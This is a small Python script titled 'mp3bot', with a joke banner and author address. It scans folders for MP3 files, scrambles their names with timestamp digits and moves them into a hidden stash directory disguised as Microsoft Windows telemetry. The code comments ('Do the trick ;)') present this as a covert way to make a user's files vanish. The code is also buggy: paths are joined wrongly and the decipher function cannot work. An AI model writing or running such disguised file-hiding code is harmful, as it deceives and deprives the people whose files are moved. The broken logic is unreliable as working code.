#############################################################################
############################                    ##########           ########
###########################     $$$$$$\  $$\     ########     $$\     #######
###                            $$ ___$$\ $$ |                 $$ |     ######
###    $$$$$$\$$$$\   $$$$$$\  \_/   $$ |$$$$$$$\   $$$$$$\ $$$$$$\     #####
###    $$  _$$  _$$\ $$  __$$\   $$$$$ / $$  __$$\ $$  __$$\\_$$  _|     ####
###    $$ / $$ / $$ |$$ /  $$ |  \___$$\ $$ |  $$ |$$ /  $$ | $$ |        ###
###    $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ | $$ |$$\     ###
###    $$ | $$ | $$ |$$$$$$$  |\$$$$$$  |$$$$$$$  |\$$$$$$  | \$$$$  |    ###
###    \__| \__| \__|$$  ____/  \______/ \_______/  \______/   \____/     ###
###                  $$ |                                               #####
################     $$ |     ###############################################
################     \__|     #########  PY EDITION v1 - 2018/09/05  ########
#################            ########## .: by SSHS (sshs@cia.gov) :. ########
#############################################################################

###################################################################### <TODO>
# Debug mode
# Give some nice information for debugging with print()
##################################################################### </TODO>

# First things first.
import os
import shutil
import time


# Variables
placesToScan = (
    "C:/_temp/pydene/mp3bot",
    # "D:/",
)
stashPath = "D:/_temp/MicrosoftWindows_Telemetry/_8_COW5WVAsynsgGD-6G4BA1/"\
    + "zula"


# Functions
def cipher(name):
    oldName = list(name[:-4])
    newName = []
    ts = list(str(int(time.time()*1000000)))
    while len(oldName) != 0:
        newName.append(oldName.pop())
        if len(ts) != 0:
            newName.append(ts.pop())
    return ".".join(newName)


def decipher(name):
    newName = name.split(".")
    oldName = newName[:32:2] + newName[32:]    # To be continued...
    return oldName + ".mp3"


# Here we go!
# TODO reportfile = open(ts+".report", "w"), \
# but where the reports will be stored?
for place in placesToScan:
    for root, dirs, files in os.walk(place):
        for filename in files:
            if os.path.isfile(filename) \
                    and filename.lower().endswith(".mp3"):
                # Do the trick ;)
                # TODO write into report file
                newName = cipher(filename)
                shutil.move(root+filename, stashPath+newName)

# TODO reportfile.close()
input()
